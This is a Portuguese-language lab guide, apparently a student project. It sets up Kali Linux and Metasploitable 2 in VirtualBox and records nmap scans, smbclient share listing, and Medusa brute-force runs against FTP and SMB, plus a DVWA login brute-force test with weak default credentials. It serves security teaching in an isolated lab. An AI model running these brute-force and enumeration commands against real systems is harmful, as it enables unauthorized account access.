# Instalação do Ambiente do Laboratório

Este guia documenta o processo completo de preparação do ambiente utilizado no desafio de força bruta com Medusa.

O laboratório será composto por:

* Kali Linux
* Metasploitable 2
* VirtualBox

---

# Objetivo do Ambiente

O objetivo deste laboratório é criar um ambiente controlado para:

* realizar testes de força bruta;
* utilizar ferramentas de auditoria de segurança;
* praticar enumeração de serviços;
* compreender vulnerabilidades comuns em FTP, HTTP e SMB.

---

# Instalação do VirtualBox

## Download do VirtualBox

Acesse o site oficial:

[https://www.virtualbox.org/](https://www.virtualbox.org/)

## Download para Linux

Na página inicial:

1. Clique em Downloads;
2. Escolha a versão compatível com seu sistema operacional;
3. Baixe o pacote correspondente.

---

# Instalação do VirtualBox no Linux

## Debian/Ubuntu/Kali

Após baixar o arquivo:

```bash
sudo dpkg -i virtualbox-*.deb
```

## Corrigindo dependências

```bash
sudo apt --fix-broken install -y
```

## Verificando instalação

```bash
virtualbox
```

---

# Download do Kali Linux para VirtualBox

## Site oficial

[https://www.kali.org/get-kali/](https://www.kali.org/get-kali/)

## Escolhendo imagem pronta para VirtualBox

1. Acesse:

```text
Virtual Machines
```

2. Baixe:

```text
Kali Linux VirtualBox Image
```

O arquivo geralmente vem compactado em:

```text
.7z
```

---

# Extraindo o Kali Linux

## Instalando o 7zip

```bash
sudo apt install p7zip-full -y
```

## Extraindo arquivo

```bash
7z x kali-linux-*.7z
```

---

# Importando Kali Linux no VirtualBox

## Abrindo VirtualBox

```bash
virtualbox
```

## Adicionando máquina virtual

1. Clique em:

```text
Machine → Add
```

2. Selecione o arquivo:

```text
.vbox
```

3. Clique em:

```text
Open
```

A máquina Kali Linux aparecerá automaticamente.

---

# Iniciando Kali Linux

1. Selecione a VM;
2. Clique em Start.

## Credenciais padrão

```text
Usuário: kali
Senha: kali
```

---

# Atualizando Kali Linux (opcional)

Após iniciar:

```bash
sudo apt update && sudo apt upgrade -y
```
---

# Download do Metasploitable 2

## Site oficial

[https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

## Arquivo esperado

```text
metasploitable-linux-2.0.0.zip
```

---

# Extraindo Metasploitable 2

## Instalando unzip

```bash
sudo apt install unzip -y
```

## Extraindo arquivo

```bash
unzip metasploitable-linux-2.0.0.zip
```

---

# Criando VM do Metasploitable 2 no VirtualBox

## Abrindo VirtualBox

```bash
virtualbox
```

## Criando nova máquina

1. Clique em:

```text
New
```

2. Nome:

```text
Metasploitable2
```

3. Tipo:

```text
Linux
```

4. Versão:

```text
Ubuntu (32-bit)
```

---

# Configuração de Memória

Recomendado:

```text
512 MB ou 1024 MB
```

---

# Configuração do Disco

## Utilizar disco existente

Selecione:

```text
Use an existing virtual hard disk file
```

## Selecionar arquivo baixado

Escolha o arquivo:

```text
Metasploitable.vmdk
```

Depois clique em:

```text
Create
```

---

# Configuração de Rede das Máquinas

## Objetivo

Permitir comunicação entre:

* Kali Linux;
* Metasploitable 2.

---

# Configurando Rede no VirtualBox

## Em ambas as VMs

1. Clique em:

```text
Settings → Network
```

2. Em Adapter 1:

Escolha:

```text
Host-Only Adapter
```

---

# Iniciando Metasploitable 2

1. Selecione VM;
2. Clique em Start.

---

# Login no Metasploitable 2

## Credenciais padrão

```text
Usuário: msfadmin
Senha: msfadmin
```

---

# Descobrindo IP do Metasploitable

No terminal:

```bash
ifconfig
```

ou

```bash
ip a
```

Exemplo:

```text
192.168.56.102
```

---

# Testando Comunicação

No Kali Linux:

```bash
ping -c 3 192.168.56.102
```

---

# Descobrindo Serviços Ativos

## Scan com Nmap

```bash
nmap -sV 192.168.56.102
```

## Resultado esperado

```text
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
445/tcp open  microsoft-ds
```

---

# Script Auxiliar para Geração de Wordlists

Foi desenvolvido um script simples em Python para automatizar a geração de combinações de usuários e senhas para visualização das combinações testada peça medusa.

## Execução

```bash
python3 gerar_wordlist.py
```

## Exemplo de saída

```text
user:123456
user:password
msfadmin:password
```
---


# Ataque de Força Bruta FTP com Medusa

Após a enumeração de serviços utilizando Nmap, foi identificado o serviço FTP ativo na máquina Metasploitable 2.

## Serviço identificado

```text
21/tcp open ftp
```

O serviço FTP foi utilizado para demonstração de ataque de força bruta em ambiente controlado.

---

# Objetivo

Demonstrar como credenciais fracas podem comprometer serviços expostos na rede através de ataques automatizados utilizando a ferramenta Medusa.

---

# Wordlists Utilizadas

## Arquivo de usuários

```text
wordlists/users.txt
```

Conteúdo:

```text
user
msfadmin
admin
root
```

---

## Arquivo de senhas

```text
wordlists/passwords.txt
```

Conteúdo:

```text
123456
password
qwerty
msfadmin
```

---

# Execução do Medusa

## Comando utilizado

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M ftp
```

---

# Explicação dos Parâmetros

| Parâmetro | Função |
|---|---|
| -h | endereço IP do alvo |
| -U | arquivo contendo usuários |
| -P | arquivo contendo senhas |
| -M ftp | módulo FTP do Medusa |

---

# Resultado Esperado

Durante a execução o Medusa realiza múltiplas tentativas de autenticação combinando usuários e senhas automaticamente.

Exemplo de saída:

```text
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin
```

---

# Vulnerabilidade Identificada

Foi identificada vulnerabilidade relacionada ao uso de credenciais fracas no serviço FTP.

## Impactos possíveis

- acesso não autorizado;
- comprometimento de arquivos;
- movimentação lateral na rede;
- exposição de informações sensíveis.

---

# Evidências

As capturas de tela desta etapa foram armazenadas na pasta:

```text
/images
```

---

# Capturas Recomendadas

## Execução do Medusa

```text
images/medusa-ftp.png
```

---

## Credencial encontrada

```text
images/ftp-credencial-encontrada.png
```

---

## Serviço FTP identificado pelo Nmap

```text
images/nmap-ftp.png
```

---

# Arquivos Relacionados

## Wordlists

```text
wordlists/users.txt
wordlists/passwords.txt
```

---

## Comandos utilizados

```text
comandos/comandos-utilizados.txt
```

---

## Script auxiliar

```text
scripts/gerar_wordlist.py
```

---

# Teste de Segurança Web com DVWA

Durante a enumeração de serviços foi identificado o serviço HTTP ativo na máquina Metasploitable 2.

## Serviço identificado

```text
80/tcp open http
```

O ambiente possui a aplicação vulnerável DVWA (Damn Vulnerable Web Application), utilizada para estudos de segurança web em ambiente controlado.

---

# Objetivo

Demonstrar testes básicos de autenticação e identificação de vulnerabilidades web utilizando o DVWA.

---

# Acessando o DVWA

No navegador do Kali Linux:

```text
http://192.168.56.102/dvwa
```

---

# Credenciais padrão

```text
Usuário: admin
Senha: password
```

---

# Testando acesso HTTP

Foi realizado acesso à aplicação DVWA através do navegador para validação do serviço HTTP identificado anteriormente pelo Nmap.

---

# Vulnerabilidades Presentes no DVWA

O DVWA possui múltiplas vulnerabilidades propositalmente inseridas para treinamento, incluindo:

- SQL Injection;
- Brute Force;
- Command Injection;
- XSS;
- File Inclusion;
- CSRF.

---

# Teste de Brute Force Web

Foi utilizada a funcionalidade:

```text
DVWA → Brute Force
```

para simular tentativas de autenticação insegura.

---

# Exemplo de Credenciais Testadas

```text
admin:password
admin:123456
user:password
```

---

# Resultado Observado

Foi possível autenticar utilizando credenciais fracas.

Exemplo:

```text
Username: admin
Password: password
```

---

# Vulnerabilidade Identificada

A aplicação apresentou vulnerabilidade relacionada ao uso de credenciais previsíveis e ausência de proteção adequada contra múltiplas tentativas de login.

---

# Possíveis Impactos

- acesso não autorizado;
- comprometimento de sessão;
- exposição de informações;
- escalonamento de privilégios.

---

# Evidências

As capturas de tela desta etapa foram armazenadas em:

```text
/images
```

---

# Capturas Recomendadas

## Página inicial do DVWA

```text
images/dvwa-home.png
```

---

## Tela de login

```text
images/dvwa-login.png
```

---

## Login realizado com sucesso

```text
images/dvwa-login-success.png
```

---

## Tela Brute Force do DVWA

```text
images/dvwa-bruteforce.png
```

---

# Comandos Relacionados

## Verificação HTTP com Nmap

```bash
nmap -sV 192.168.56.102
```

---

# Teste de Segurança SMB com Medusa

Durante a enumeração de serviços foi identificado o serviço SMB ativo na máquina Metasploitable 2.

## Serviço identificado

```text
445/tcp open microsoft-ds
```

O SMB (Server Message Block) é utilizado para compartilhamento de arquivos e autenticação em rede.

---

# Objetivo

Demonstrar testes básicos de autenticação em serviços SMB utilizando Medusa em ambiente controlado.

---

# Verificando Compartilhamentos SMB

Foi utilizado o smbclient para identificar compartilhamentos disponíveis no alvo.

## Comando utilizado

```bash
smbclient -L //192.168.56.102 -N
```

---

# Explicação do comando

| Parâmetro | Função |
|---|---|
| smbclient | cliente SMB |
| -L | lista compartilhamentos |
| //192.168.56.102 | endereço do alvo |
| -N | conexão sem senha |

---

# Resultado Esperado

Exemplo:

```text
Sharename       Type
tmp             Disk
opt             Disk
IPC$            IPC
```

---

# Ataque de Força Bruta SMB com Medusa

Após identificar o serviço SMB, foi realizado teste de autenticação automatizada utilizando Medusa.

---

# Wordlists Utilizadas

## Usuários

Arquivo:

```text
wordlists/users.txt
```

Conteúdo:

```text
user
msfadmin
admin
root
guest
```

---

## Senhas

Arquivo:

```text
wordlists/passwords.txt
```

Conteúdo:

```text
123456
password
qwerty
msfadmin
toor
guest
```

---

# Comando Utilizado

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt
```

---

# Explicação dos Parâmetros

| Parâmetro | Função |
|---|---|
| -h | IP do alvo |
| -U | lista de usuários |
| -P | lista de senhas |
| -M smbnt | módulo SMB do Medusa |

---

# Resultado Esperado

Exemplo de credencial encontrada:

```text
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin
```

---

# Vulnerabilidade Identificada

O serviço SMB apresentou vulnerabilidade relacionada ao uso de credenciais fracas e autenticação insegura.

---

# Possíveis Impactos

- acesso indevido a compartilhamentos;
- vazamento de arquivos;
- movimentação lateral na rede;
- comprometimento de sistemas internos.

---

# Evidências

As capturas de tela desta etapa foram armazenadas na pasta:

```text
/images
```

---

# Capturas Recomendadas

## Compartilhamentos SMB encontrados

```text
images/smb-shares.png
```

---

## Execução do Medusa SMB

```text
images/medusa-smb.png
```

---

## Credencial SMB encontrada

```text
images/smb-credencial-encontrada.png
```

---

# Comandos Relacionados

## Enumeração SMB

```bash
smbclient -L //192.168.56.102 -N
```

---

## Teste de autenticação SMB

```bash
medusa -h 192.168.56.102 -U wordlists/users.txt -P wordlists/passwords.txt -M smbnt
```

---

# Medidas de Mitigação

Para reduzir riscos relacionados ao SMB:

- utilização de senhas fortes;
- desativação do SMBv1;
- restrição de acesso por firewall;
- segmentação de rede;
- autenticação multifator;
- monitoramento de tentativas de login.

---

# Considerações Éticas

Todos os testes realizados ocorreram exclusivamente em ambiente controlado e autorizado para fins educacionais.
